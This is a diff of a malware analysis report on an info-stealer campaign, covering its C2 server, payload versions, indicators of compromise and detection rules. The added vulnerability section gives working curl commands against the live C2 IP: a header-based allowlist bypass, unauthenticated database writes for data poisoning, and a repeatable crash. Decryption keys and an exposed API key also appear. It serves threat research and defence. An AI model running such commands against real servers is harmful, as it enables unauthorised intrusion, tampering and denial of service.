-| TLS SHA1 fingerprint | `57:FA:98:59:74:BF:A8:FA:91:48:F0:10:D1:99:DB:05:1A:48:4A:84` |
-| TLS expires | 2026-09-15 |
-| nginx leaked via | TRACE method 405 response body |
+| Layer | Software | Evidence |
+|---|---|---|
+| Edge/WAF | DDoS-Guard | `Server: ddos-guard`, `__ddg*` cookies |
+| Reverse proxy | nginx | TRACE 405: `<center>nginx</center>` |
+| Application | Python Flask + Werkzeug | 403 body: Werkzeug default forbidden HTML |
+| Auth | Discord OAuth + username/password | `/auth/discord`, `btn-discord` CSS class |
 
 ### Endpoint Map
 
-| Endpoint | Method | Status | Notes |
+| Route | No Bypass | With Bypass | Notes |
 |---|---|---|---|
-| `/` | GET | 302 | Redirects to `/auth/login` |
-| `/auth/login` | GET | **403** | Admin panel — IP-allowlisted |
-| `/auth/login` | OPTIONS | **200** | CORS preflight succeeds — allowed methods: GET, POST, OPTIONS, HEAD |
-| `/auth/login` | PUT/PATCH/DELETE | 405 | Flask method not allowed |
-| `/auth/logout` | GET | **403** | Endpoint confirmed (not 404) |
-| `/dashboard` | GET | 308 | Permanent redirect to `/auth/login` |
-| `/favicon.ico` | GET | **200** | 270 KB Windows BMP ICO |
-| `/shard/prefireMc` | GET | **405** | Endpoint EXISTS, expects POST |
-| `/shard/prefireMc` | POST | 403 | IP-blocked |
-| `/shard/submitMinecraftLog` | POST | 403 | Endpoint confirmed |
-| `/cdn/e/3b8f6d2a9c1e` | GET | **200** | **LIVE PAYLOAD — actively serving** |
+| `/cdn/e/3b8f6d2a9c1e` | **200** | **200** | Public — no auth |
+| `/auth/login` | 403 | 403 | DDoS-Guard edge IP block |
+| `/auth/discord` | 403 | 403 | DDoS-Guard edge IP block |
+| `/dashboard/` | 302→403 | 302→403 | Redirects to login |
+| `/dashboard/remote` | 302→403 | 302→403 | Live connections panel |
+| `/dashboard/settings` | 302→403 | 302→403 | Panel settings |
+| `/dashboard/users` | 302→403 | 302→403 | User management |
+| `/static/css/style.css` | **200** | **200** | nginx serves directly |
+| `/static/css/auth.css` | **200** | **200** | nginx serves directly |
+| `/static/css/dashboard.css` | **200** | **200** | nginx serves directly |
+| `/static/js/app.js` | **200** | **200** | nginx serves directly |
+| `/shard/prefireMc` | 403 | **400** | Header bypass — field validation |
+| `/shard/submitData` | 403 | **200** | Unauthenticated DB write |
+| `/shard/submitFile` | 403 | **400** | Needs multipart |
+| `/shard/submitLogs` | 403 | **500** | Crash on any input |
+| `/shard/submitMinecraftLog` | 403 | **400** | Field validation |
 
-### 403 Bypass Attempts
+### 403 Bypass Attempts — Phase 1
 
-| Technique | Result |
-|---|---|
-| X-Forwarded-For spoofing (127.0.0.1, 192.168.x.x) | 403 — not bypassed |
-| Path normalisation variants (`/auth//login`, `/./auth/login`, `/%61uth/login`) | 403 or 404 |
-| HTTP method switching (PUT, PATCH, DELETE) | 405 — methods rejected |
-| Host header injection (127.0.0.1, localhost) | **503** — reveals DDoS-Guard backend detection |
-| OPTIONS method | **200** — CORS misconfiguration; no `Access-Control-Allow-Origin` returned |
+Headers tested against `/auth/login` — none bypassed DDoS-Guard edge block:
 
-> **Assessment:** The `/auth/login` 403 is enforced by DDoS-Guard IP allowlisting at the proxy layer, not by Flask itself. Bypassing it requires either a source IP in the operator's allowlist or a DDoS-Guard bypass technique.
+```
+X-Forwarded-For: 127.0.0.1          -> 403
+X-Real-IP: 127.0.0.1               -> 403
+CF-Connecting-IP: 127.0.0.1        -> 403
+True-Client-IP: 127.0.0.1          -> 403
+x-cdn-origin-verify: trusted-upstream -> 403
+Host: 127.0.0.1                    -> 503 (backend detection)
+```
 
-### Live Payload — V2 (Downloaded 2026-07-20 18:05 UTC)
+The `/auth/*` and `/dashboard/*` IP allowlist is enforced at the DDoS-Guard edge level
+and cannot be bypassed via header spoofing.
 
-| Property | V1 (original sample) | V2 (live) |
-|---|---|---|
-| Encryption | AES-128-CBC (raw) | Python Fernet (AES-128-CBC + HMAC-SHA256) |
-| Encryption key | `207570de60034b19d76df8e7aefc69b7` | `74af664f79d1ef1436a4bf301788c7eb207570de60034b19d76df8e7aefc69b7` |
-| Key relationship | Original AES-128 key | Old AES key = last 16 bytes of new Fernet key |
-| Fernet timestamp | N/A | 2026-07-20 18:05 UTC (re-encrypted during our analysis) |
-| `app.pyd` SHA256 | `1280ff5f2c4a59e8a9...` | **IDENTICAL** |
-| Stage-1 mypyc component | `81d243bd2c585b0f...` | `52056f4b964f1bc0...` (updated) |
-| Bundle files | 736 | 736 |
+### Live Payload Downloads and Version History
+
+| Version | Time (UTC) | Raw Size | SHA256 (first 16) | Content |
+|---|---|---|---|---|
+| V1 | ~16:19 | 16,777,593 B | (in JAR) | AES-128-CBC, 60 files, stripped |
+| V2 | 18:05 | 22,236,792 B | `69a74db222b5c001` | Fernet, 736 files, full dev bundle |
+| V3 | 18:38 | 21,151,403 B | unknown | Fernet, trimmed (-5%), not extracted |
+| V4 | 18:52 | 22,236,792 B | `5c1609320d9cc846` | Fernet re-encrypt of V2 — same content |
+
+Fernet timestamp delta V2→V4: **2,798s (46m 38s)**. Same key throughout all versions.
 
 ### Operator Behaviour Assessment
 
-| Observation | Assessment |
-|---|---|
-| Payload re-encrypted within hours of our analysis | Operator monitors CDN access logs in near real-time |
-| Upgraded AES-CBC to Fernet (adds HMAC integrity) | Response to known decryption — attempted to harden |
-| Stealer `app.pyd` unchanged | Operator prioritised speed over updating stealer logic |
-| Stage-1 mypyc component updated | New campaign build or launcher bug fix |
-| Admin panel restricted to operator IP range | DDoS-Guard allowlisting in use |
-| Fernet key pre-embedded in v1 binary | OPSEC failure — full key rotation not performed |
+During the 90-minute window the operator made 4 pushes indicating active monitoring:
 
----
-
-## Indicators of Compromise
-
-### Network IOCs
-
-| Type | Value | Status |
-|---|---|---|
-| IP | `185.178.208.191` | **LIVE** |
-| Domain | `thisisafalsepositive.st` | **LIVE** |
-| Domain | `thisisafalsepositive.ru` | NXDOMAIN |
-| Domain | `sltnnt.ru` | NXDOMAIN (fallback) |
-| Domain | `v3` through `v7.thisisafalsepositive.ru` | NXDOMAIN |
-| User-Agent | `...Chrome/142.0.0.0 Safari/537.36` | Anomalous |
-| HTTP Header | `X-Runtime-Env` | C2 beacon marker |
-| HTTP Header | `X-Tracking-ID` | C2 session marker |
-| HTTP Header | `X-Edge-Cache-Revalidate` | C2 marker |
-| URL pattern | `/cdn/e/[a-z0-9]+` | Payload download |
-| TLS SHA1 | `57:FA:98:59:74:BF:A8:FA:91:48:F0:10:D1:99:DB:05:1A:48:4A:84` | C2 cert |
-
-### Blockchain IOCs
-
-| Type | Value |
-|---|---|
-| Polygon contract | `0x9c0a507300fd902787bb193d80fca5ce6e1bff9a` |
-| Operator wallet | `0x6767c6496541b530a5d1d0eb9b80bd5c7bf56767` |
-| Exposed RPC API key | `xbhWBI1Wkguk8SNMu1bvvLurPGLXmgwYeC4S6g2H7WdwFigZSmPWVZRxrskEQwIf` |
-
-### Cryptographic IOCs
-
-| Type | Value |
-|---|---|
-| Stage-1 AES-128 key | `207570de60034b19d76df8e7aefc69b7` |
-| Stage-2 Fernet key (v2) | `74af664f79d1ef1436a4bf301788c7eb207570de60034b19d76df8e7aefc69b7` |
-| Staging UUID | `4015d0e9-4cab-4ac1-8dfd-5ee8f283bca1` |
-| V1 payload SHA256 | `23ab6a5d46f20bc8fe23800195558cb99caacf43e2ecd80f7090f74fe0fe1068` |
-| V2 payload SHA256 | `69a74db222b5c001ce0f25b93e4a1f5ab591fb263c9499c62b79f9ff3d633ee3` |
-| `app.pyd` SHA256 | `1280ff5f2c4a59e8a9301d8e2eb7c2e9774ec6026a48905c52d23fb1974438bf` |
-
-### File System IOCs
-
-| Path | Purpose |
-|---|---|
-| `%TEMP%\svchost_d.log` | Stealer debug log |
-| `%TEMP%\*.tmp` | Injected DLL (temporary) |
-| `%LOCALAPPDATA%\python.exe` | Staged Python runtime |
-| `%LOCALAPPDATA%\python312._pth` | Modified to enable site-packages |
-| `%LOCALAPPDATA%\pip.exe` | Staged pip |
-
-### Registry IOCs
-
-```
-HKLM\SOFTWARE\Valve\Steam
-HKLM\SOFTWARE\Wow6432Node\Valve\Steam
-HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
-HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths
-HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths
-```
-
-### Process and Pipe IOCs
-
-| Type | Value |
-|---|---|
-| Named pipe pattern | `\\.\pipe\[0-9a-f]{8}` |
-| Staging UUID check | Local HTTP server on `127.0.0.1` |
-| DLL injection target | `chrome.exe`, `msedge.exe`, `brave.exe` (via `CreateRemoteThread`) |
-
-### Regex IOCs
-
-```
-Discord token:    [\w-]{24}\.[\w-]{6}\.[\w-]{25,110}
-Browser profile:  ^(Default|Profile\s+\d+)$
-Telegram exclude: user_data[^/\\]*[/\\](media_cache|cache)($|[/\\])
-```
-
----
-
-## Anti-Analysis and Evasion Techniques
-
-| ID | Technique | Detail |
-|---|---|---|
-| E-01 | DNS-over-HTTPS | All DNS via Cloudflare DoH at socket level |
-| E-02 | Blockchain C2 | Polygon smart contract — cannot be seized |
-| E-03 | Nuitka compilation | Python compiled to native x64 PE |
-| E-04 | Custom cipher | Rolling XOR + 256-byte S-box on constant pool |
-| E-05 | DLL injection | Bypasses browser file locks without termination |
-| E-06 | Handle duplication | Secondary file lock bypass via `DuplicateHandle` |
-| E-07 | Silent errors | `SetErrorMode` suppresses all error dialogs |
-| E-08 | C2 domain naming | `thisisafalsepositive.st` — social engineering |
-| E-09 | Log disguise | `svchost_d.log` mimics Windows service log |
-| E-10 | Socket patch | `getaddrinfo` replaced at Python level |
-| E-11 | Fake Chrome version | `Chrome/142.0.0.0` does not exist |
-| E-12 | Persistence check | Local HTTP server prevents double-staging |
-| E-13 | Size limits | Telegram excludes large cache directories |
-| E-14 | Timeout protection | All operations wrapped in 3-second timeout |
-
----
-
-## Defensive Recommendations
-
-### Immediate Actions
-
-1. Block `185.178.208.191` at perimeter firewall
-2. Block DNS resolution for `thisisafalsepositive.st` and `sltnnt.ru`
-3. Report API key `xbhWBI1Wkguk8SNMu1...` to rpcfast.com abuse team for revocation
-4. Block Polygon RPC endpoints in outbound firewall if not operationally required
-5. Submit contract `0x9c0a507300fd902787bb193d80fca5ce6e1bff9a` to Polygon ecosystem abuse contacts
-
-### SIEM / EDR Detection Rules
-
-```yaml
-# Anomalous Chrome version (Chrome/142 does not exist)
-- rule: HTTP User-Agent contains "Chrome/142"
-
-# C2 beacon headers
-- rule: Outbound HTTP request contains header "X-Tracking-ID" or "X-Runtime-Env"
-
-# DNS-over-HTTPS evasion from non-browser process
-- rule: Outbound HTTPS to cloudflare-dns.com/dns-query NOT from browser process
-
-# DLL injection into browser
-- rule: CreateRemoteThread where source != chrome.exe AND target IN [chrome.exe, msedge.exe, brave.exe]
-
-# Named pipe IPC pattern
-- rule: Named pipe created matching pattern [0-9a-f]{8}
-
-# Python staging in user directories
-- rule: python.exe or pip.exe created in %LOCALAPPDATA% or %TEMP%
-
-# Stealer log file
-- rule: File created matching svchost_d.log in user profile directories
-
-# Payload download
-- rule: HTTP GET to */cdn/e/* with response size > 10 MB
-```
-
-### Threat Hunting Queries
-
-```
-# Proxy / firewall logs
-dest_domain IN [thisisafalsepositive.st, sltnnt.ru]
-OR dest_ip = 185.178.208.191
-
-# Polygon RPC outbound (endpoints should not query blockchain)
-dest_domain IN [
-  polygon-rpc.com, rpc-mainnet.matic.quiknode.pro,
-  polygon-public.nodies.app, polygon-bor-rpc.publicnode.com,
-  1rpc.io, endpoints.omniatech.io, api.zan.top
-]
-
-# Unusual Python downloads from endpoints
-url CONTAINS "python-3.12.7-embed-amd64.zip"
-OR url CONTAINS "bootstrap.pypa.io/get-pip.py"
-```
-
----
-
-## Source Files Index
-
-The `source/` directory contains 30 reconstructed Python module files. Each file contains all string literals, SQL queries, file paths, class names, function names, and identifiers extracted directly from the compiled binary constant pool — authentic strings from the original Python source code.
-
-| File | Module | Description |
-|---|---|---|
-| `app.py` | `app` | Entry point, orchestration, arg parser |
-| `app_config.py` | `app.config` | Configuration, validation |
-| `app_contract.py` | `app.contract` | Polygon C2 domain resolver |
-| `app_crypto.py` | `app.crypto` | Crypto wrappers (AES/DPAPI/PBKDF2) |
-| `app_handlers.py` | `app.handlers` | Handler package init |
-| `app_handlers_browser.py` | `app.handlers.browser` | Chromium credential theft (17 browsers) |
-| `app_handlers_browser_extensions.py` | `app.handlers.browser_extensions` | Wallet extension collection |
-| `app_handlers_credentials.py` | `app.handlers.credentials` | Non-browser credential theft (20+ apps) |
-| `app_handlers_discord.py` | `app.handlers.discord` | Discord token theft |
-| `app_handlers_files.py` | `app.handlers.files` | File and upload management |
-| `app_handlers_firefox.py` | `app.handlers.firefox` | Firefox credential theft |
-| `app_handlers_keywords.py` | `app.handlers.keywords` | Document keyword search |
-| `app_handlers_minecraft.py` | `app.handlers.minecraft` | Minecraft account theft (8 launchers) |
-| `app_handlers_screenshot.py` | `app.handlers.screenshot` | Screen capture |
-| `app_handlers_system_info.py` | `app.handlers.system_info` | WMI system fingerprinting |
-| `app_handlers_wallets.py` | `app.handlers.wallets` | Crypto wallet theft (13 wallets) |
-| `app_http.py` | `app.http` | HTTP + DoH + C2 headers |
-| `app_logging.py` | `app.logging` | Logging classes |
-| `app_resources.py` | `app.resources` | Resources package init |
-| `app_resources_browser_module.py` | `app.resources.browser_module` | XOR-encoded DLL payload |
-| `app_staging.py` | `app.staging` | Self-installer, persistence |
-| `app_trace.py` | `app.trace` | Debug tracer |
-| `app_util.py` | `app.util` | Util package init |
-| `app_util_crypto.py` | `app.util.crypto` | Low-level crypto wrappers |
-| `app_util_dll_injection.py` | `app.util.dll_injection` | Browser DLL injector |
-| `app_util_file.py` | `app.util.file` | File helpers |
-| `app_util_handle_copy.py` | `app.util.handle_copy` | File lock bypass via handle duplication |
-| `app_util_pipe.py` | `app.util.pipe` | Named pipe IPC |
-| `app_util_process.py` | `app.util.process` | Process management |
-| `app_util_registry.py` | `app.util.registry` | Registry access |
-
----
-
-## Timeline
-
-| Date | Event |
-|---|---|
-| 2026-01-18 | Polygon smart contract deployed, `sltnnt.ru` set as C2 |
-| 2026-05-09 | Domain rotated to `thisisafalsepositive.ru` |
-| 2026-06-07 | Rapid domain rotation — 5 changes in 2 hours (takedown response) |
-| 2026-06-17 | Moved to `.st` TLD — `thisisafalsepositive.st` (current, live) |
-| 2026-07-20 | Full malware analysis completed; live C2 scanned; V2 payload downloaded and decrypted |
-
----
-
-*Analysis performed: 2026-07-20*  
-*Platform: Parrot OS Linux (static + dynamic analysis)*  
-*Tools: pefile, capstone, unicorn, Frida, objdump, Python 3.12*
+1. `~16:19` — Original AES-CBC bundle served from JAR
+2. `18:05` — Switched to Fernet, accidentally pushed full dev bundle (736 files, 38MB)
+3. `18:38` — Trimmed bundle (-5%) correcting dev artifact leak
+4. `18:52` — Fernet timestamp rotation — same key, same content as V2
 
 ---
 
 ## C2 Admin Panel Analysis
 
-> Static file bypass: nginx serves `/static/` directly without passing through Flask IP checks,
-> exposing the complete panel CSS and JavaScript despite the `/auth/login` 403 block.
-
 ### Server Architecture
 
 ```
-Internet -> DDoS-Guard (proxy/WAF) -> nginx -> Python Flask
+Internet -> DDoS-Guard (edge WAF) -> nginx (reverse proxy) -> Python Flask (app)
 ```
 
-| Layer | Software | Evidence |
+### Static Files Extracted — nginx Bypass
+
+| File | Size | Intelligence |
 |---|---|---|
-| Edge | DDoS-Guard | `Server: ddos-guard` response header |
-| Reverse proxy | nginx | TRACE method 405 body: `<center>nginx</center>` |
-| Application | Python Flask | 403 body: Werkzeug default forbidden page |
-| Auth | Discord OAuth + username/password | `btn-discord` class, `/auth/discord` route |
-| Maps | Leaflet.js | `leaflet-container`, `#hitMap` CSS classes |
+| `/static/css/style.css` | 38,210 B | Full design system, all component classes |
+| `/static/css/auth.css` | 6,240 B | Login page, Discord button, card animations |
+| `/static/css/dashboard.css` | 9,476 B | Victim map, connections table, action menus |
+| `/static/js/app.js` | 5,038 B | Full panel JS — dropdown, modal, toast, sidebar |
 
-### Static Files Extracted (nginx bypass)
+### Panel Feature Map
 
-| File | Size | Contents |
-|---|---|---|
-| `/static/css/style.css` | 38,210 bytes | Full panel design system, all component styles |
-| `/static/css/auth.css` | 6,240 bytes | Login page styles, Discord button, card animations |
-| `/static/css/dashboard.css` | 9,476 bytes | Victim map, connections table, action menus |
-| `/static/js/app.js` | 5,038 bytes | Dropdown, modal, toast, sidebar JS — **full source** |
-
-### Confirmed Routes
-
-| Route | Method | Status | Notes |
-|---|---|---|---|
-| `/auth/login` | GET/POST | 403 | IP-allowlisted admin panel login |
-| `/auth/discord` | GET | 403 | Discord OAuth entry — endpoint confirmed |
-| `/auth/logout` | GET | 403 | Session logout confirmed |
-| `/dashboard/` | GET | 302 → 403 | Main dashboard (auth required) |
-| `/dashboard/remote` | GET | 302 → 403 | Live connections / remote access |
-| `/dashboard/settings` | GET | 302 → 403 | Panel settings |
-| `/dashboard/users` | GET | 302 → 403 | User management |
-| `/static/css/style.css` | GET | **200** | Bypasses Flask — served by nginx directly |
-| `/static/css/auth.css` | GET | **200** | Bypasses Flask |
-| `/static/css/dashboard.css` | GET | **200** | Bypasses Flask |
-| `/static/js/app.js` | GET | **200** | Bypasses Flask — full JS source |
-| `/cdn/e/3b8f6d2a9c1e` | GET | **200** | Live payload — actively updated |
-
-### Panel Feature Map (Reconstructed from CSS)
-
-| Feature | Evidence | Class Names |
-|---|---|---|
-| Discord OAuth login | `btn-discord` with #5865F2 gradient | `.btn-discord`, `/auth/discord` |
-| Live victim world map | Leaflet.js integration | `#hitMap`, `.leaflet-container`, `.popup-ip`, `.popup-org` |
-| Real-time connections table | PC, user, IP, country, ping, elevation | `.connection-pc`, `.connection-user`, `.connection-ip`, `.connection-ping` |
-| Elevated privilege indicator | Admin/SYSTEM badge | `.elevated-yes` (red glow), `.elevated-no` |
-| Per-victim action menu | Dropdown with destructive actions | `.action-menu`, `.action-item.danger` |
-| Country flag display | Per-victim geolocation | `.country-flag`, `.connection-country` |
-| Stat cards | Victim count, connections, builds, logs | `.stat-card`, `.stat-value`, `.stat-change` |
-| Build generator | BETA-tagged sidebar section | `.sidebar-beta-badge`, `.code-block` |
-| Remote access section | Live C2 shell/command panel | `.remote-header`, `.remote-stats`, `.remote-stat-value` |
-| Premium locked features | MaaS tier gating | `.locked`, `.sidebar-lock-icon`, `--premium-gold`, `--premium-glow` |
-| Sidebar navigation | Collapsible sections, localStorage state | `.sidebar-section`, `.sidebar-section-toggle` |
-| Toast notification system | Success/warning/error toasts | `.toast-container`, `window.Toast` |
-| Modal dialogs | Overlay modals | `.modal`, `.modal-backdrop`, `.modal-body` |
-| Code syntax highlighting | Build config display | `.keyword`, `.string`, `.comment`, `.function`, `.number` |
+| Feature | CSS Evidence |
+|---|---|
+| Discord OAuth login | `.btn-discord`, `/auth/discord` |
+| Live victim world map (Leaflet.js) | `#hitMap`, `.leaflet-container`, `.popup-ip`, `.popup-org` |
+| Real-time connections table | `.connection-pc`, `.connection-user`, `.connection-ip`, `.connection-ping` |
+| Elevated privilege indicator | `.elevated-yes` (red glow), `.elevated-no` |
+| Per-victim action menu | `.action-menu`, `.action-item.danger` |
+| Stat cards (victims, connections, builds, logs) | `.stat-card`, `.stat-value`, `.stat-change` |
+| Build generator (BETA) | `.sidebar-beta-badge`, `.code-block` |
+| Remote access / live shell | `.remote-header`, `.remote-stats`, `.remote-stat-value` |
+| Premium tier gating | `.locked`, `.sidebar-lock-icon`, `--premium-gold` |
+| Country flag display | `.country-flag`, `.connection-country` |
+| Toast notifications | `.toast-container`, `window.Toast` |
+| Modal dialogs | `.modal`, `.modal-backdrop` |
 
 ### Reconstructed Login Page
-
-Based on `auth.css` class analysis, the login page at `/auth/login` contains:
 
 ```html
 <div class="auth-container">
@@ -828,30 +481,22 @@ Based on `auth.css` class analysis, the login page at `/auth/login` contains:
       <h1 class="auth-title">Welcome Back</h1>
       <p class="auth-subtitle">Sign in to your account to continue</p>
     </div>
-
-    <!-- Primary: Discord OAuth -->
     <a href="/auth/discord" class="btn btn-discord btn-full">
       Continue with Discord
     </a>
-
     <div class="auth-divider">or</div>
-
-    <!-- Secondary: username + password form -->
     <form method="POST" action="/auth/login">
       <input type="hidden" name="csrf_token">
       <input class="form-input" type="text" name="username">
       <input class="form-input" type="password" name="password">
       <button class="btn btn-primary btn-full">Sign In</button>
     </form>
-
     <button class="auth-toggle">Forgot password?</button>
   </div>
 </div>
 ```
 
 ### Reconstructed Dashboard Structure
-
-Sidebar navigation sections inferred from CSS:
 
 ```
 SilentNet Panel
@@ -873,32 +518,467 @@ SilentNet Panel
 
 ### app.js — Full Source (Recovered)
 
-The complete panel JavaScript was recovered. Key functionality:
-
+Complete panel JavaScript recovered via nginx bypass. Key functionality:
 - **Dropdown menus**: click-outside-close, toggle open/close
 - **Modal system**: `window.openModal(id)` / `window.closeModal(id)`
 - **Toast notifications**: `window.Toast.success/warning/error(message, duration)`
-- **Range inputs**: real-time value display
-- **Sidebar**: mobile toggle, backdrop, scroll position persistence (sessionStorage)
-- **Sidebar sections**: collapse/expand with localStorage persistence
+- **Sidebar**: mobile toggle, backdrop, scroll persistence (sessionStorage)
+- **Sidebar sections**: collapse/expand with localStorage state persistence
 
-### Live Payload Update Activity
+---
 
-During the 90-minute scan window the CDN payload at `/cdn/e/3b8f6d2a9c1e` changed size **twice**:
+## Payload Version Comparison (V1 / V2 / V3 / V4)
 
-| Time (UTC) | Size | Event |
+### Bundle Composition Diff (V1 vs V2)
+
+V1 was a deliberately stripped minimal deployment — Python library source omitted (anti-analysis).
+V2 was the full development bundle accidentally pushed by the operator.
+
+| Library | V1 | V2 | Delta |
+|---|---|---|---|
+| File count total | 60 | 736 | +676 |
+| Bundle size | 23,565,009 B | 38,231,657 B | +14,666,648 B |
+| pycryptodome | Absent | 249 files (4.1MB) | Added |
+| PIL/Pillow | Binary .pyd only | 100 files (3.8MB) | Added |
+| pywin32 + win32com | Partial .pyd | 232 files (4.5MB) | Added |
+| psutil | Binary .pyd only | 11 files (425KB) | Added |
+| requests + urllib3 | Partial | Full (58 files) | Completed |
+| idna | Absent | 11 files | Added |
+| vdf | Absent | 2 files | Added |
+| `charset_normalizer/models.py` | 0 bytes (stub) | 13,190 bytes | Restored |
+
+### Stealer Core Immutability
+
+Byte-for-byte identical across V1, V2, and V4:
+
+| File | SHA256 |
+|---|---|
+| `AppHost/app.pyd` | `1280ff5f2c4a59e8a9301d8e2eb7c2e9774ec6026a48905c...` |
+| `AppHost/main.py` | `bc87ec291523785fd9f8b1925e92dbe5aa71af4a9dd631c7...` |
+| `mypyc stage-1 .pyd` | `52056f4b964f1bc0419064a374a32e56ef85ccb161166971...` |
+| `python312.zip` | `50923b458dad653990105637b17227af36cde152cfc1f88c...` |
+
+The operator has not modified the stealer logic across any version.
+
+### Operator Push Activity
+
+| Time (UTC) | Ver | Size | Notes |
+|---|---|---|---|
+| ~16:19 | V1 | 16,777,593 B | Original AES-CBC bundle in JAR |
+| 18:05 | V2 | 22,236,792 B | Fernet, full dev bundle (accidental) |
+| 18:38 | V3 | 21,151,403 B | Fernet trimmed (-5%) — correcting V2 |
+| 18:52 | V4 | 22,236,792 B | Fernet timestamp rotation, V2 content |
+
+---
+
+## C2 Server Vulnerabilities
+
+### CVE-Class Findings Summary
+
+| ID | Title | Severity | CVSS (est.) | POC |
+|---|---|---|---|---|
+| VULN-01 | Flask IP Allowlist Bypass via Header | HIGH | 8.6 | `poc_01_ip_bypass.py` |
+| VULN-02 | Unauthenticated Arbitrary DB Write | HIGH | 8.2 | `poc_02_db_write.py` |
+| VULN-03 | Persistent DoS via submitLogs | MEDIUM | 6.5 | `poc_03_submitlogs_dos.py` |
+| VULN-04 | nginx Static File Auth Bypass | MEDIUM | 5.3 | `poc_05_static_bypass.py` |
+| VULN-05 | Hardcoded Fernet Encryption Key | CRITICAL | 9.1 | `poc_04_fernet_decrypt.py` |
+| VULN-06 | Public Blockchain C2 Resolver | INFO | 3.1 | `poc_06_blockchain_resolver.py` |
+| VULN-07 | No Input Validation on submitData | MEDIUM | 5.8 | `poc_02_db_write.py` |
+
+---
+
+### VULN-01 — Flask IP Allowlist Bypass via X-Runtime-Env Header
+
+**Severity:** HIGH (CVSS 8.6) | **Endpoint:** All `/shard/*` routes | **POC:** `poc/poc_01_ip_bypass.py`
+
+The Flask application restricts `/shard/*` endpoints to allowlisted IP addresses. The check is bypassed
+by setting `X-Runtime-Env: jre-embedded` — the value sent by the legitimate Java launcher. The server
+trusts this header from any source IP without verification.
+
+```bash
+# Without bypass
+curl -X POST https://185.178.208.191/shard/prefireMc \
+  -H "Host: thisisafalsepositive.st"
+# HTTP 403
+
+# With bypass — IP allowlist circumvented from any IP
+curl -X POST https://185.178.208.191/shard/prefireMc \
+  -H "Host: thisisafalsepositive.st" \
+  -H "X-Runtime-Env: jre-embedded" \
+  -H "X-Edge-Cache-Revalidate: stale-if-error"
+# HTTP 400 (past IP check, failing field validation)
+```
+
+---
+
+### VULN-02 — Unauthenticated Arbitrary Write to Victim Database
+
+**Severity:** HIGH (CVSS 8.2) | **Endpoint:** `POST /shard/submitData` | **POC:** `poc/poc_02_db_write.py`
+
+After applying VULN-01, `/shard/submitData` accepts **any JSON payload** with zero field validation,
+storing it in the C2 operator's victim database and returning a `logUuid`. No auth token, schema
+validation, rate limiting, or size limit enforced.
+
+```bash
+curl -X POST https://185.178.208.191/shard/submitData \
+  -H "Host: thisisafalsepositive.st" \
+  -H "X-Runtime-Env: jre-embedded" \
+  -H "Content-Type: application/json" \
+  -d '{"any": "json", "payload": "accepted"}'
+# {"logUuid": "<uuid>"}
+```
+
+**Impact:** Data poisoning of victim database. No server-side delete endpoint exists.
+
+---
+
+### VULN-03 — Persistent Denial-of-Service via /shard/submitLogs
+
+**Severity:** MEDIUM (CVSS 6.5) | **Endpoint:** `POST /shard/submitLogs` | **POC:** `poc/poc_03_submitlogs_dos.py`
+
+`/shard/submitLogs` raises an unhandled Python exception for every possible `logs` field value
+(null, array, integer, string, dict, boolean). Every request returns HTTP 500. 100% crash rate confirmed.
+
+```bash
+curl -X POST https://185.178.208.191/shard/submitLogs \
+  -H "Host: thisisafalsepositive.st" \
+  -H "X-Runtime-Env: jre-embedded" \
+  -H "Content-Type: application/json" \
+  -d '{"logs": null}'
+# HTTP 500 Internal Server Error (100% reproducible)
+```
+
+---
+
+### VULN-04 — nginx Static File Exposure Bypassing Flask Auth
+
+**Severity:** MEDIUM (CVSS 5.3) | **Endpoint:** `GET /static/*` | **POC:** `poc/poc_05_static_bypass.py`
+
+nginx serves `/static/` directly without routing through Flask, bypassing the IP allowlist
+protecting `/auth/login` and `/dashboard/*`. All panel CSS and JS are readable from any IP.
+
+```bash
+# Protected route — 403
+curl -o /dev/null -w "%{http_code}" \
+  https://185.178.208.191/auth/login -H "Host: thisisafalsepositive.st"
+# 403
+
+# nginx-served static file — 200, no auth required
+curl -o style.css -w "%{http_code}" \
+  https://185.178.208.191/static/css/style.css -H "Host: thisisafalsepositive.st"
+# 200 (38,210 bytes)
+```
+
+---
+
+### VULN-05 — Hardcoded Fernet Key in Compiled Binary
+
+**Severity:** CRITICAL (CVSS 9.1) | **POC:** `poc/poc_04_fernet_decrypt.py`
+
+The 32-byte Fernet key used to encrypt all CDN payloads is hardcoded in the Nuitka constant pool
+(PE resource section type 10, id 3). All payload versions — past, present, and future — encrypted
+with this key can be decrypted.
+
+```
+Key: 74af664f79d1ef1436a4bf301788c7eb207570de60034b19d76df8e7aefc69b7
+```
+
+Verified valid against V1, V2, and V4. HMAC-SHA256 verification passes for all versions.
+
+---
+
+### VULN-06 — Blockchain C2 Domain Resolver (Public Smart Contract)
+
+**Severity:** INFO (CVSS 3.1) | **POC:** `poc/poc_06_blockchain_resolver.py`
+
+The C2 domain is stored as plaintext in a public Polygon contract readable by anyone.
+Intended as a resilience mechanism, it also exposes the current C2 domain to defenders in real time.
+
+```bash
+curl -X POST https://polygon-public.nodies.app \
+  -H "Content-Type: application/json" \
+  -d '{"jsonrpc":"2.0","method":"eth_call",
+       "params":[{"to":"0x9c0a507300fd902787bb193d80fca5ce6e1bff9a",
+                  "data":"0xce6d41de"},"latest"],"id":1}'
+# Returns: thisisafalsepositive.st
+```
+
+---
+
+### VULN-07 — No Input Validation on submitData (Schema-Free DB Write)
+
+**Severity:** MEDIUM (CVSS 5.8) | **Requires:** VULN-01
+
+Builds on VULN-02. Payloads structured to mimic real victim credential logs
+(`type=passwords`, `data=[...]`) are stored and rendered identically to genuine victim data
+in the operator's panel, enabling targeted data poisoning.
+
+```bash
+curl -X POST https://185.178.208.191/shard/submitData \
+  -H "X-Runtime-Env: jre-embedded" \
+  -H "Content-Type: application/json" \
+  -d '{"type":"passwords","data":[{"url":"https://example.com",
+        "username":"victim","password":"hunter2"}]}'
+# {"logUuid": "<uuid>"} — stored alongside real victim data
+```
+
+---
+
+## Indicators of Compromise
+
+### Network IOCs
+
+| Indicator | Type | Description |
 |---|---|---|
-| 18:05 | 22,236,792 bytes | Initial download — Fernet-encrypted, decrypted successfully |
-| 18:38 | 21,151,403 bytes | Second update — operator actively pushing builds during scan |
+| `thisisafalsepositive.st` | Domain | Active C2 (blockchain-resolved) |
+| `sltnnt.ru` | Domain | Previous C2 domain |
+| `185.178.208.191` | IP | C2 server |
+| `/cdn/e/3b8f6d2a9c1e` | URL path | CDN payload endpoint |
+| `/shard/prefireMc` | URL path | Minecraft beacon |
+| `/shard/submitData` | URL path | Data exfil endpoint |
